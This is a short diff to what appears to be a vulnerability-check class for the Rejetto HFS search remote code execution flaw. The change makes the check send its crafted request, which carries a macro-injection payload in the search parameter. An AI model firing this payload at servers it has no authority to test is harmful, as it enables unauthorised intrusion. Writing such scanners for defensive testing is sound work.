@@ -25,7 +25,7 @@ class hfs_rejetto_search_rce_BaseVerify:
             sess = requests.Session()
             sess.get(vulnurl, headers=headers, timeout=10, verify=False)
             checkurl = self.url + "/?search==%00{.cookie|out|value={.load|res.}.}"
-            req = sess.get(vulnurl, headers=headers, timeout=10, verify=False)
+            req = sess.get(checkurl, headers=headers, timeout=10, verify=False)
             check_cookie = req.headers.get("set-cookie")
             if check_cookie is None:
                 pass
